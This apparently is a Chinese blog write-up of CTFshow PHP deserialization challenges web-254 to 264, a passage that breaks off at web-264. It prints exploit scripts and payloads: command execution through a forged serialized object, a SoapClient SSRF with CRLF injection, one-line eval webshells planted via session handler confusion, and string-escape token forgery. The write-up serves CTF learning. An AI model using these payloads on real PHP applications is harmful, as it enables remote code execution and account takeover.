<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>　CTFSHOW_WP(254-378) | yake-daigua</title><meta name="keywords" content="CTFSHOW"><meta name="author" content="yake-daigua"><meta name="copyright" content="yake-daigua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="反序列化web-254&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx 我丢，看了半天。。。。。。还没开始反序列化。 web-2551234567891011121314151617181920212223242526272829303132333435363738error_reporting(0);highlight_file(__FIL">
<meta property="og:type" content="article">
<meta property="og:title" content="　CTFSHOW_WP(254-378)">
<meta property="og:url" content="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(254-378)/index.html">
<meta property="og:site_name" content="yake-daigua">
<meta property="og:description" content="反序列化web-254&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx 我丢，看了半天。。。。。。还没开始反序列化。 web-2551234567891011121314151617181920212223242526272829303132333435363738error_reporting(0);highlight_file(__FIL">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg">
<meta property="article:published_time" content="2022-10-31T15:12:24.000Z">
<meta property="article:modified_time" content="2022-10-31T15:58:10.365Z">
<meta property="article:author" content="yake-daigua">
<meta property="article:tag" content="CTFSHOW">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg"><link rel="shortcut icon" href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg"><link rel="canonical" href="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(254-378)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '　CTFSHOW_WP(254-378)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-31 23:58:10'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/mycss2.css"><link rel="stylesheet" href="/css/mycss3.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yake-daigua</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">　CTFSHOW_WP(254-378)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-31T15:12:24.000Z" title="发表于 2022-10-31 23:12:24">2022-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-31T15:58:10.365Z" title="更新于 2022-10-31 23:58:10">2022-10-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/CTFSHOW/">CTFSHOW</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="　CTFSHOW_WP(254-378)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web-254"><a href="#web-254" class="headerlink" title="web-254"></a>web-254</h3><p>&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p>
<p>我丢，看了半天。。。。。。还没开始反序列化。</p>
<h3 id="web-255"><a href="#web-255" class="headerlink" title="web-255"></a>web-255</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;yake&#x27;;</span><br><span class="line">    public $password=&#x27;daigua&#x27;;</span><br><span class="line">    public $isVip=true;</span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfShowUser();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-257"><a href="#web-257" class="headerlink" title="web-257"></a>web-257</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    private $username=&#x27;yake&#x27;;</span><br><span class="line">    private $password=&#x27;daigua&#x27;;</span><br><span class="line">    private $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    private $code=&quot;system(&#x27;tac flag.php&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new ctfShowUser();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>直接调backDoor，析构的时候会调命令。</p>
<h3 id="web-258"><a href="#web-258" class="headerlink" title="web-258"></a>web-258</h3><p>套了一层过滤，不能有<code>o:数字:</code>和<code>c:数字:</code>，oc不区分大小写。</p>
<p>只需要加上一个+就行，额，原理自己去看函数库吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code=&quot;system(&#x27;tac f*&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new ctfShowUser();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">$b=str_replace(&quot;O:&quot;,&quot;O:+&quot;,$b);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意属性是public，不是上一题的public，我看了好久。。。。。。</p>
<h3 id="web-259"><a href="#web-259" class="headerlink" title="web-259"></a>web-259</h3><p>嗝，SSRF？什么原生类？看了别人的WP之后才知道是SoapClient。又一看《CTFer从0到1》有。。。。。。应该好好看圣经的</p>
<p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1709236552525677652&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1709236552525677652&amp;wfr=spider&amp;for=pc</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ua = &quot;Lxxx\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line"></span><br><span class="line">$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27; , &#x27;user_agent&#x27; =&gt; $ua));</span><br><span class="line"></span><br><span class="line">print_r(urlencode(serialize($client)));</span><br></pre></td></tr></table></figure>

<p>如果了解SSRF的大概能知道这是怎么一回事。以后遇到了会再次深入学习，现在先过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?vip=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22Lxxx%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<h3 id="web-260"><a href="#web-260" class="headerlink" title="web-260"></a>web-260</h3><p>属于是无聊之神了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(serialize(&quot;ctfshow_i_love_36D&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-261"><a href="#web-261" class="headerlink" title="web-261"></a>web-261</h3><p>当类中同时定义了 <em><strong>unserialize()</strong></em> 和 <strong>wakeup()</strong> 两个魔术方法， <em><strong>则只有 unserialize() 方法会生效</strong></em>，__wakeup() 方法会被忽略。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshowvip&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;username=&quot;877.php&quot;;</span><br><span class="line">       		$this-&gt;password=&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfshowvip();</span><br><span class="line">echo urlencode(serialize($a));    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们的code无法控制，直接用弱比较，877&#x3D;0x36d</p>
<p>还有一点，就是传入$符号的时候要转义！！！</p>
<h3 id="web-262"><a href="#web-262" class="headerlink" title="web-262"></a>web-262</h3><p>我们结合这message.php看，知道在index生成一个user权限的cookie，然后访问message拿flag。</p>
<p>第一种解法非常简单，我们直接自己生成一个admin的cookie就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;admin&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$m=new message();</span><br><span class="line">echo base64_encode(serialize($m));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>第二种方法才是重点，字符串逃逸。这里给出一个链接，自行观看。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/109043560">https://blog.csdn.net/solitudi/article/details/109043560</a></p>
<p>看完之后想必你已经了解了字符串逃逸的原理。</p>
<p>O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”2”;s:2:”to”;s:1:”3”;s:5:”token”;s:5:”admin”;}</p>
<p>我们可以看到，需要逃逸的字符串是”;s:5:”token”;s:5:”admin”;}</p>
<p>总长度为27，fuck用loveU替换的话，反序列化回来时就会溢出一位，导致 “ 被覆盖，所以我们需要覆盖27位的话，需要在前一个属性里面加上27个fuck，让字符串完全逃逸。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from=&quot;1&quot;;</span><br><span class="line">    public $msg=&quot;1&quot;;</span><br><span class="line">    public $to=&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">    public $token=&#x27;admin&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new message();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b.&quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">$b=str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, $b);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:135:&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br><span class="line"></span><br><span class="line">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;?f&#x3D;1&amp;m&#x3D;1&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck”;s:5:”token”;s:5:”admin”;}</p>
<h3 id="web-263"><a href="#web-263" class="headerlink" title="web-263"></a>web-263</h3><p>session反序列化的考察</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:25:&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:25:&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问log-1.php，1=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p>嗝，看到官方给出的讲解都把自己绕进去了。可能理解起来不太容易。</p>
<p><em><strong>说实话在很久之前我学习反序列化时看见过别人写的session反序列化，nmmd，他写的一大堆还都是错的，现在看来他是跟着大菜鸡师傅（官方）的视频做的，搞得我看了一整天。这次系统刷题，又花了两个小时来进行梳理。</strong></em></p>
<p>这里简单介绍一下</p>
<p>SESSION反序列化漏洞是因为php页面调用的session存储方式不同所导致的<br>默认是调用php，而这题默认的是php_serialize<br>php和php_serialize的区别如下<br>php：		name|s:5:“ocean”;<br>php_serialize：	a:1:{s:4:“name”;s:5:“ocean”;}<br>我们需要注意一点，在php中不能包含php_serialize，但是在php_serialize中可以包含php。<br>php中 | 符号的左右为键值和键名。这就是漏洞产生的原因。</p>
<p>我们分析源代码，可以知道index是php_serialize<br>inc和check是php<br>我们还可以看到在inc中可以控制username和password去写一句话木马</p>
<p>接着我们进行分析，在index中，$_SESSION[‘limit’]&#x3D;base64_decode($_COOKIE[‘limit’]);<br>这样的一句话利用cookie控制limit，进而控制session<br>当我们访问index，先在index校验是否超过五次登录，生成一个session在服务器上<br>没有超过五次，到check去判断，然后对我们的session操作<br>到这里然后呢？和我们的inc写木马有什么关系呢？</p>
<p>我们重新想想，反序列化是指通过输入的序列化内容被反序列化之后调用服务器上的资源<br>我们要调用的是inc中的类<br>而check刚好包含了inc，使得我们可以反序列化<br>析构函数的时候可以写入木马去getshell</p>
<p>再一次重申，我们的重点是session反序列化<br>在index界面我们用check界面用的session序列化<br>因为上面又说，在index界面是可以包含check和inc的<br>别问为什么，问去上面再好好看看php和php_serialize<br>我们在index界面修改session的本质理由是<br>我们需要在服务器上有一个恶意的session能调inc类<br>使得我们在访问index时<br>php解析这个恶意的session<br>使得我们的一句话木马被成功的写入1.php</p>
<p><em><strong>如果你还看不懂的话，多看几遍。</strong></em></p>
<h3 id="web-264"><a href="#web-264" class="headerlink" title="web-264"></a>web-264</h3><p>可以直接用262的payload，但要记得最后cookie传一个msg</p>
